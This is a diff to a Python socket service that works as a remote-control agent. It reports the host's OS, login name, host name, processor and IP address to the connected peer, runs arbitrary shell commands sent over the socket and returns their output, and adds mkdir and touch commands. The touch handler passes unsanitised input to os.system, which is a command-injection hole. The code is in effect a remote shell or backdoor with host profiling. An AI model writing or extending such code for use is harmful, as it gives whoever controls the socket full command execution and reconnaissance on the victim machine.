@@ -5,8 +5,6 @@ http_port: int = 11451
 
 import os
 import socket
-import requests
-import urllib
 import platform
 
 
@@ -26,6 +24,8 @@ def socket_service():
             client_message = client_message.replace("\n","")
             client_message = client_message.strip()
 
+            print(client_message+";")
+
             if client_message == 'exit':
                 http_socket.close()
                 exit(0)
@@ -42,7 +42,19 @@ def socket_service():
                 information = '\n'+os_name + '\n' + os_login + "\n" + host_name +"\n"+machine+"\n"+processor+"\n"+ip+"\n"
 
                 http_socket.send(information.encode())
+                continue
 
+
+            if client_message.startswith("mkdir "):
+                create_path = client_message[6:len(client_message)]
+                os.mkdir(create_path)
+                http_socket.send("create ok!".encode())
+                continue
+
+            if client_message.startswith("touch "):
+                create_path = client_message[6:len(client_message)]
+                os.system("echo '' > "+create_path)
+                http_socket.send("create ok!".encode())
 
             if client_message.startswith("shell:"):
                 shell: str = client_message[client_message.index("shell:")+6:len(client_message)]
@@ -61,17 +73,23 @@ def socket_service():
                         http_socket.send("cd: "+cd_path+" error!")
                     continue
                 else:
-                    run = os.popen("cd "+run_path+" & "+shell)
+                    run = os.popen("cd "+run_path+" && "+shell)
                     #o = open(os.environ['HOME']+"/command_run_log.log")
-                    http_socket.send(bytes(run.read().encode()))
+                    s = run.read()
+                    run.close()
+                    http_socket.send(bytes(s.encode()))
+                    continue
+
+            if client_message == 'none':
+                http_socket.send(" ".encode())
 
             else:
                 http_socket.send(bytes("send command error".encode()))
-
+                continue
                 
         except:
             http_socket.send("send command error".encode())
-
+            continue
 
 if __name__ == '__main__':
     socket_service()
